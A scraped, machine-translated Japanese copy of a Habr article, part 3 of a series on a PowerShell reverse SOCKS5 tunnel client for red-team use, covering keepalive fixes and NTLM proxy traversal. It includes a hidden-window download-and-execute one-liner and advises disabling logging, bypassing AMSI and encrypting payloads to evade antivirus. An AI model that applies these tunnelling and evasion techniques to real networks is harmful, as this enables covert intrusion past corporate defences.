<!doctype html>
<html class="no-js" lang="ja">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>✊ 🤷 👩‍🎨 PowerShellでReverse socks5プロキシを作成します。パート3 💥 🕓 👎</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="3つの部分での研究開発の物語。パート3は実用的です。
 ブナはたくさんあります-さらに多くの利点があります
 
 サイクルの以前の記事はこことここにあります =）
 
 バトルチェック
 スクリプトの操作を実際にテストしてみましょう。これを行うには、仮想マシン（Windows 7 .net 4.7）...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>PowerShellでReverse socks5プロキシを作成します。パート3</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/454254/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3つの部分での研究開発の物語。</font><font style="vertical-align: inherit;">パート3は実用的です。</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ブナはたくさんあります-さらに多くの利点があります</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
サイクルの以前の記事は</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ここ</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">と</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ここに</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">あり</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;">ます</font></a><font style="vertical-align: inherit;"> =）</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">バトルチェック</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
スクリプトの操作を実際にテストしてみましょう。</font><font style="vertical-align: inherit;">これを行うには、仮想マシン（Windows 7 .net 4.7）からDigital Ocean上のLinux VPSにリバーストンネルをスローし、それを使用して、Win7に戻ります。</font><font style="vertical-align: inherit;">この場合、Windows 7がお客様のマシンであり、Linux VPSがサーバーである状況をシミュレートします。</font></font><br>
<a name="habracut"></a><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
VPS（この場合はUbuntu 18.04）では、RsocksTunのサーバー部分をインストールして構成します。</font></font><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">golangを設定します：apt install golang</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">rsockstunのソースをgitaから取得します。git </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
clone </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">github.com/mis-team/rsockstun.git</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> / opt / rstun</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">依存関係をインストールします：</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 github.com/hashicorp/yamux </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 を取得しますgithub.com/armon/go-socks5 </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 を取得し</font><font style="vertical-align: inherit;">ますgithub.com/ThomsonReutersEikon/go-ntlm/ntlm </font><font style="vertical-align: inherit;">を取得します</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">マニュアルに従ってコンパイルします：cd / opt / rstun; </font><font style="vertical-align: inherit;">ビルドに行きます</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SSL証明書を生成：</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
openssl req -new -x509 -keyout server.key -out server.crt -days 365 -nodes</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">サーバー部分を開始します。</font></font></li>
</ul><br>
<img src="https://habrastorage.org/webt/c6/rx/45/c6rx45gxq1qcabdtdvdczplgq8m.png"><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">クライアントでスクリプトを開始し、接続するサーバー、ポート、パスワードを指定します。</font></font></li>
</ul><br>
<img src="https://habrastorage.org/webt/f2/hz/ks/f2hzksob9ctx8qsvrt-p1ycg0fe.png"><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Socks5サーバーの上げられたポートを使用してmail.ruに移動します。</font></font></li>
</ul><br>
<img src="https://habrastorage.org/webt/fi/ye/lj/fiyeljrteulwjd0xfihggiovhsk.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
スクリーンショットからわかるように、スクリプトは機能します。</font><font style="vertical-align: inherit;">私たちは嬉しくて、精神的に記念碑を建てて、すべてが完璧であると決めました。</font><font style="vertical-align: inherit;">だが…</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">エラー処理</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
しかし、すべてが私たちが望むほどスムーズであるとは限りません... </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
スクリプトの操作中に、不快な瞬間が見つかりました。スクリプトがサーバーへの接続が非常に高速ではない場合、ビッグデータを転送するときに下の図に示すエラーが発生する可能性があります。</font></font><br>
<br>
<img src="https://habrastorage.org/webt/kb/sd/bn/kbsdbnzfegxlymwrz8bcygd7qeo.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
このエラーを調査した結果、キープアライブメッセージを受信したとき（データがまだサーバーに送信されているとき）、キープアライブへの応答を同時にソケットに書き込もうとすると、エラーが発生します。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
状況を修正するには、データ転送が完了するまで待ってから、キープアライブに応答を送信する必要があります。しかし、ここで別の問題が発生する可能性があります。12バイトのヘッダーを送信してからデータを送信するまでの間にキープアライブメッセージが到着すると、ymxパケットの構造が破壊されます。したがって、より正確な解決策は、yamuxScript内でデータを送信するためのすべての機能を転送することです。この機能は、順次送信するイベントを処理し、そのような状況はありません。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
同時に、キープアライブ応答を送信するようにyamuxScriptに指示するには、共有ArrayList StopFlag [0]を使用できます。ゼロのインデックスは使用されません。 yamuxストリームの番号は1から始まります。このインデックスでは、キープアライブメッセージで受信したping値をyamuxScriptで渡します。デフォルトでは、値は-1になり、送信は不要です。 YamuxScriptはこの値をチェックし、それが0（最初のキープアライブping = 0）以上の場合、渡された値をキープアライブ応答に送信します。</font></font><br>
<br>
<pre><code class="plaintext hljs">if ($StopFlag[0] -ge 0){<font></font>
#got yamux keepalive. we have to reply<font></font>
$outbuf = [byte[]](0x00,0x02,0x00,0x02,0x00,0x00,0x00,0x00) + [bitconverter]::getbytes([int32]$StopFlag[0])[3..0]<font></font>
$state.tcpstream.Write($outbuf,0,12)<font></font>
$state.tcpstream.flush()<font></font>
$StopFlag[0] = -1<font></font>
}</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
YMX SYNフラグへの応答をプログラムのメインスレッドで送信することも除外する必要があります。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
これを行うには、この機能をyamuxScript内でも転送する必要がありますが、yamuxサーバーはYMX SYNに応答を送信する必要がなく、すぐにデータの送信を開始するため、このパッケージの送信を無効にするだけで、次のようになります。</font></font><br>
<br>
<pre><code class="plaintext hljs">#$outbuf = [byte[]](0x00,0x01,0x00,0x02,$ymxstream[3],$ymxstream[2],$ymxstream[1],$ymxstream[0],0x00,0x00,0x00,0x00)<font></font>
#$tcpstream.Write($outbuf,0,12)</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
その後、大量のデータの転送は正常に機能します。</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">プロキシサポート</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
次に、プロキシサーバーを介してクライアントを機能させる方法について考えてみましょう。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
基本から始めましょう。</font><font style="vertical-align: inherit;">理論的には、http-proxy（つまり、httpプロキシはほとんどの企業ネットワークで機能します）はHTTPプロトコルで動作するように設計されており、httpは私たちのような臭いはしないようです。</font><font style="vertical-align: inherit;">しかし、実際には、httpに加えて、httpsもあり、ブラウザは通常のhttpを介してhttpsサイトに完全に接続できます。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
この理由は、特別なプロキシサーバー操作モード-CONNECTモードです。</font><font style="vertical-align: inherit;">したがって、ブラウザがプロキシサーバーを介してhttps経由でGmailサーバーに接続する場合は、ホストと宛先ポートを示すCONNECTリクエストをプロキシサーバーに送信します。</font></font><br>
<br>
<pre><code class="plaintext hljs">CONNECT gmail.com:443 HTTP/1.1<font></font>
Host: gmail.com:443<font></font>
Proxy-Connection: Keep-Alive</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Gmailサーバーへの接続が成功した後、プロキシは200 OK応答を返します。</font></font><br>
<br>
<pre><code class="plaintext hljs">HTTP/1.1 200 OK</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
その後、ブラウザからのすべてのデータは直接サーバーに送信され、その逆も同様です。簡単に言うと、プロキシは2つのネットワークソケットを相互に直接接続します-ブラウザソケットとGmailサーバーソケットです。その後、ブラウザーはGmailサーバーとのssl接続を確立し、それを直接操作し始めます。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
上記をクライアントに転送するには、まずプロキシサーバーとの接続を確立し、CONNECTメソッドとyamuxサーバーのアドレスを示すhttpパケットを送信し、コード200の応答を待ってから、ssl接続の確立に進む必要があります。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
原則として、特に複雑なものはありません。これは、プロキシサーバーを介した接続メカニズムがgolangクライアントのrsockstunに実装されている方法です。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
主な問題は、プロキシサーバーが自身に接続するときにntlmまたはkerberosの承認が必要な場合に始まります。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
この場合、プロキシサーバーは407コードとntlm httpヘッダーをbase64文字列として返します</font></font><br>
<br>
<pre><code class="plaintext hljs">HTTP/1.1 407 Proxy Authentication Required<font></font>
Proxy-Authenticate: NTLM TlRMTVNTUAACAAAAAAAAADgAAABVgphianXk2614u2AAAAAAAAAAAKIAogA4AAAABQEoCgAAAA8CAA4AUgBFAFUAVABFAFIAUwABABwAVQBLAEIAUAAtAEMAQgBUAFIATQBGAEUAMAA2AAQAFgBSAGUAdQB0AGUAcgBzAC4AbgBlAHQAAwA0AHUAawBiAHAALQBjAGIAdAByAG0AZgBlADAANgAuAFIAZQB1AHQAZQByAHMALgBuAGUAdAAFABYAUgBlAHUAdABlAHIAcwAuAG4AZQB0AAAAAAA=<font></font>
Date: Tue, 28 May 2019 14:06:15 GMT<font></font>
Content-Length: 0</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
承認を成功させるには、この行をデコードし、そこからパラメーター（ntlm-challenge、ドメイン名など）を削除する必要があります。</font><font style="vertical-align: inherit;">次に、このデータとユーザー名とそのntlmハッシュを使用して、ntlm応答を生成し、base64にエンコードして戻し、プロキシサーバーに送り返す必要があります。</font></font><br>
<br>
<pre><code class="plaintext hljs">CONNECT mail.com:443  HTTP/1.1<font></font>
Host: mail.com:443<font></font>
Proxy-Authorization: NTLM TlRMTVNTUAADAAAAGAAYAHoAAAA6AToBkgAAAAwADABYAAAACAAIAGQAAAAOAA4AbAAAAAAAAADMAQAABYKIIgYBsR0AAAAPnHZSXCGeU7zoq64cDFENAGQAbwBtAGEAaQBuAHUAcwBlAHIAVQBTAEUAUgAtAFAAQwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABuxncy1yDsSypAauO/N1TfAQEAAAAAAAAXKmWDXhXVAag3UE8RsOGCAAAAAAIADgBSAEUAVQBUAEUAUgBTAAEAHABVAEsAQgBQAC0AQwBCAFQAUgBNAEYARQAwADYABAAWAFIAZQB1AHQAZQByAHMALgBuAGUAdAADADQAdQBrAGIAcAAtAGMAYgB0AHIAbQBmAGUAMAA2AC4AUgBlAHUAdABlAHIAcwAuAG4AZQB0AAUAFgBSAGUAdQB0AGUAcgBzAC4AbgBlAHQACAAwADAAAAAAAAAAAAAAAAAwAAA2+UpsHCJmpIGttOj1VN+5JbP1D1HvJsbPKpKyd63trQoAEAAAAAAAAAAAAAAAAAAAAAAACQAcAEgAVABUAFAALwAxADIANwAuADAALgAwAC4AMQAAAAAAAAAAAA==<font></font>
User-Agent: curl/7.64.1<font></font>
Accept: */*<font></font>
Proxy-Connection: Keep-Alive</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
しかし、これはそれほど悪くはありません。実際のところ、スクリプトを実行しても、現在のユーザーの名前も、ユーザーのntlmパスワードハッシュもわかりません。したがって、プロキシサーバーでの承認のために、ユーザー名/他の場所からのパスを見つける必要があります。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
理論的には、スクリプトでこの機能を実装できます（GoLangクライアントで行われるように手動で認証パラメーターを設定し、mimikatzで行われるようにLSASSプロセスのメモリダンプを使用して終了します）。しかし、スクリプトは信じられないほどのサイズと複雑さ、特にこれらのトピックはこの記事の範囲を超えていることに注意してください。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
私たちは反対に行くと思って決めました...</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
承認を手動で行う代わりに、組み込み機能を使用して、HTTPWebRequestクラスのプロキシサーバーを操作します。ただし、この場合は、RsocksTunサーバーのコードを変更する必要があります。結局のところ、クライアントからリクエストを受け取ったときは、パスワード付きの文字列のみを期待し、完全なHTTPリクエストを受け取ります。原則として、rsoskstunのサーバー側の変更はそれほど難しくありません。 http-requestのどの部分でパスワードを送信するか（たとえば、XAuth http-headerになる）を決定し、http-requestを処理する機能を実装し、ヘッダーをパスワードでチェックし、返信http-response（200 OK）を送信するだけです。この機能をRSocksTunプロジェクトの別のブランチに追加しました。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
RSocksTun（サーバーとクライアント）のGolang部分を変更した後、プロキシサーバーを使用する機能をスクリプトに追加します。</font><font style="vertical-align: inherit;">プロキシ経由でWebサーバーに接続するためのHttpWebRequestクラスの最も単純なコードは次のようになります。</font></font><br>
<br>
<pre><code class="plaintext hljs">[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};<font></font>
$request = [System.Net.HttpWebRequest]::Create("https://gmail.com:443")<font></font>
$request.Method = "GET"<font></font>
$request.Headers.Add("Xauth","password")<font></font>
$proxy = new-object system.net.webproxy('http://127.0.0.1:8080');<font></font>
$proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials<font></font>
$request.Proxy = $proxy<font></font>
try {$serverResponse = $request.GetResponse()} catch {write-host "Can not connect"; exit}</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
この場合、HttpWebRequestクラスのインスタンスを作成し、ProxyプロパティとCredentialsプロパティを設定して、カスタムXAuth http-headerを追加します。</font><font style="vertical-align: inherit;">したがって、Googleサーバーへのリクエストは、プロキシサーバー127.0.0.1:8080を経由します。</font><font style="vertical-align: inherit;">プロキシが承認を要求すると、Windows自体が現在のユーザーのクレジットを「取得」し、適切なhttpヘッダーを挿入します。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
プロキシサーバーを手動で指定する代わりに、プロキシサーバーのシステム設定を使用できます。</font></font><br>
<br>
<pre><code class="plaintext hljs">$proxy = [System.Net.WebRequest]::GetSystemWebProxy()</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
したがって、プロキシサーバーを介してrsockstunサーバーに接続し、コード200のHTTP応答を受け取った後、少しトリックを行う必要があります。つまり、HTTPWebRequestクラスから、$ tcpConnection.getStreamのような読み取り/書き込み用のストリームオブジェクトを取得します。 （）。これは、.Netリフレクションインスペクションメカニズムを通じて行われます（このメカニズムをさらに詳しく理解したい場合は、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">リンクを</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">共有して</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;">ください</font></a><font style="vertical-align: inherit;">）。これにより、基になるクラスのメソッドとプロパティにアクセスできます。</font></font><br>
<br>
<pre><code class="plaintext hljs">#---------------------------------------------------------------------------------<font></font>
# Reflection inspection to retrieve and reuse the underlying networkStream instance<font></font>
$responseStream = $serverResponse.GetResponseStream()<font></font>
$BindingFlags= [Reflection.BindingFlags] "NonPublic,Instance"<font></font>
$rsType = $responseStream.GetType()<font></font>
$connectionProperty = $rsType.GetProperty("Connection", $BindingFlags)<font></font>
$connection = $connectionProperty.GetValue($responseStream, $null)<font></font>
$connectionType = $connection.GetType()<font></font>
$networkStreamProperty = $connectionType.GetProperty("NetworkStream", $BindingFlags)<font></font>
$tcpStream = $networkStreamProperty.GetValue($connection, $null)</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
したがって、プロキシサーバーによってyamuxサーバーに接続され、読み取り/書き込み操作を実行できる同じソケットストリームを取得しました。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
考慮する必要があるもう1つのポイントは、接続のステータスを監視するメカニズムです。</font><font style="vertical-align: inherit;">プロキシサーバーとHTTPWebRequestクラスを介して作業しているため、$ tcpConnection.Connectedプロパティがなく、何らかの方法で接続ステータスを監視する必要があります。</font><font style="vertical-align: inherit;">これは、別の$ connectedフラグを使用して行うことができます。これは、プロキシサーバーから200コードを受信すると$ trueに設定され、ソケットストリームからの読み取り中に例外が発生すると$ falseにリセットされます。</font></font><br>
<br>
<pre><code class="plaintext hljs">try { $num = $tcpStream.Read($tmpbuffer,0,12) } catch {$connected=$false; break;}<font></font>
if ($num -eq 0 ) {$connected=$false; break;}</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
それ以外の場合、コードは変更されません。</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">インライン起動</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
原則として、すべての正気な人々はPS1ファイルから同様のスクリプトを実行しますが、時々（そして実際-ほとんど常に）pentest / redtimeのプロセスで、トレースを残さないように、ディスクに何も書き込まずにコマンドラインからモジュールを実行する必要があります。さらに、powershellでは、コマンドラインからこれを完全に実行できます。</font></font><br>
<br>
<pre><code class="plaintext hljs">powershell.exe –c &lt;powershell code&gt;<font></font>
powershell.exe –e &lt;base64 powershell code&gt;</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ただし、コマンドの起動と実行の秘密については、あまりリラックスしないでください。第一に、すべてのpowershellコードは、対応するイベントログ（Windows PowerShellおよびMicrosoft-Windows-PowerShell / Operational）の標準のWindowsツールを使用してログに記録され、第二に、powershell内で実行されるすべてのコードはAMSIメカニズム（マルウェア対策スキャンインターフェイス）。もう1つは、これらのメカニズムはどちらも、複雑でないアクションでは完全にコストがかかることです。雑誌を無効にしてAMSIをバイパスすることは別の話題であり、今後の記事やチャンネルでそのことを説明します。しかし、今、他のことについて少し。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
実際、スクリプトはかなり印象的なサイズに成長しており、どのコマンドラインにも適合しないことは明らかです（Windowsのcmd制限は8191文字です）。したがって、スクリプトをディスクに書き込まずに実行する方法を考え出す必要があります。そしてここでは、マルウェアが使用する標準的な方法が、15年近くの間私たちを助けてきました。要するに、ルールは簡単です-ダウンロードして実行します。主なことは混同しないことです=）</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ダウンロードして実行するコマンドは次のようになります。</font></font><br>
<br>
<pre><code class="plaintext hljs">powershell.exe –w hidden -c "IEX ((new-object net.webclient).downloadstring('http://url.com/script.ps1'))"</code></pre><br><font style="vertical-align: inherit;"></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HarmJ0y git</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 'Iで</font><font style="vertical-align: inherit;">
さらに多くのインライン起動オプションを見つけることができます</font><font style="vertical-align: inherit;">。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
もちろん、ダウンロードする前に、ログを無効にし、AMSIをバイパスまたは無効にするように注意する必要があります。</font><font style="vertical-align: inherit;">スクリプト自体はダウンロードする前に暗号化する必要があります。</font><font style="vertical-align: inherit;">ダウンロードプロセスの間、それは当然あなたの（またはあなたの=ではない）アンチウイルスによって上下にチェックされ、開始する前に-それに応じて復号化します。</font><font style="vertical-align: inherit;">これを行う方法-あなたは、読者がすでに自分で考えているはずです。</font><font style="vertical-align: inherit;">これはこのトピックの範囲を超えています。</font><font style="vertical-align: inherit;">しかし、私たちはこの問題のクールなスペシャリスト、全能のGoogleを知っています。</font><font style="vertical-align: inherit;">AMSIをバイパスする例だけでなく、ネットワーク上の暗号化と復号化の例がたくさんあります。</font></font><br>
<br>
<h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">すべての部分への結論</font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
その過程で、「リバーストンネル」の技術とペンテストへの使用について読者に紹介し、そのようなトンネルのいくつかの例を示し、それらの長所と短所について話しました。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
また、次の機能を備えたRsocksTunサーバーへのPowerShellクライアントを作成することもできました。</font></font><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SSL接続</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">サーバーでの承認。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">キープアライブpingをサポートするyamux-serverで動作します。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">操作のマルチスレッドモード。</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">承認付きのプロキシサーバーを介したサポート作業。</font></font></li>
</ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
すべてのrsockstunコード（golangおよびpowershell）は、</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">githubの</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">対応するブランチ</font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ja&amp;u="><font style="vertical-align: inherit;">にあります。</font></a><font style="vertical-align: inherit;">masterブランチはプロキシサーバーなしで機能するように設計されており、via_proxyブランチはプロキシとHTTPを介して機能するように設計されています。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
コードの改善や実際の開発の適用性についてのコメントや提案をお待ちしております。</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
これで、リバーストンネリングの記事のサイクルが完了しました。</font><font style="vertical-align: inherit;">あなたが私たちを読むことに興味があり、情報が役に立つことを本当に望みます。</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ja454240/index.html">ウェーブレット分析。パート3</a></li>
<li><a href="../ja454242/index.html">「ほら、なんてジェットパックなんだ！」「あ、なんてロケットだ！」（ロケット選手権からのメモ）</a></li>
<li><a href="../ja454246/index.html">Unity3d GUIで使用されるさまざまな座標</a></li>
<li><a href="../ja454248/index.html">人工知能の時代の農奴</a></li>
<li><a href="../ja454252/index.html">有名な組織のWebリソースでさえ、子供の過ちから保護されていません。</a></li>
<li><a href="../ja454256/index.html">ITの何が問題になっていますか</a></li>
<li><a href="../ja454260/index.html">不正なコードに対する子供の日</a></li>
<li><a href="../ja454262/index.html">すべてのデータサイエンティストがDaskを知っておくべき理由</a></li>
<li><a href="../ja454264/index.html">Youtubeの技術面接に関する4つの説明チャンネル</a></li>
<li><a href="../ja454266/index.html">Computex 2019でのDellとAlienware：主要なイノベーションについて語る</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>